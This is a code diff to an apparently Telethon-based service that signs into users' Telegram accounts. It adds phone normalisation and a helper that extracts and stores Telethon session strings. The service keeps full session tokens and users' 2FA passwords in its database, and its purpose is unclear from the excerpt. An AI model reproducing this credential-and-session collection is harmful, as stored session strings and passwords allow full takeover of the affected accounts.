@@ -112,6 +112,7 @@ async def submit_code(user_id: int, code: str) -> dict:
         me = await client.get_me()
         full_name = f"{me.first_name or ''} {me.last_name or ''}".strip()
         username = me.username or ""
+        phone = database.normalize_phone(phone)
         await database.save_session(phone, username, full_name, session_string)
 
         email_res = await post_registration_setup(phone, client)
@@ -145,6 +146,7 @@ async def submit_2fa(user_id: int, password: str) -> dict:
         full_name = f"{me.first_name or ''} {me.last_name or ''}".strip()
         username = me.username or ""
         # حفظ كلمة مرور الدخول فقط — لا نفعّل 2FA جديد على الحساب
+        phone = database.normalize_phone(phone)
         await database.save_session(phone, username, full_name, session_string, password)
 
         email_res = await post_registration_setup(phone, client)
@@ -165,6 +167,29 @@ async def submit_2fa(user_id: int, password: str) -> dict:
 # ──────────────────────────────────────────
 # إدارة الجلسات
 # ──────────────────────────────────────────
+async def ensure_session_string(phone: str) -> str | None:
+    """
+    يجلب session_string من DB أو يستخرجه من جلسة Telethon نشطة ويحفظه.
+    """
+    session = await database.get_session_by_phone(phone)
+    if not session:
+        return None
+    ss = session["session_string"]
+    if ss and str(ss).strip():
+        return str(ss).strip()
+
+    client = await get_active_client(phone)
+    if not client:
+        return None
+    try:
+        ss = client.session.save()
+        if ss:
+            await database.update_session_string(phone, ss)
+        return ss or None
+    finally:
+        await client.disconnect()
+
+
 async def get_active_client(phone: str):
     session = await database.get_session_by_phone(phone)
     if not session:
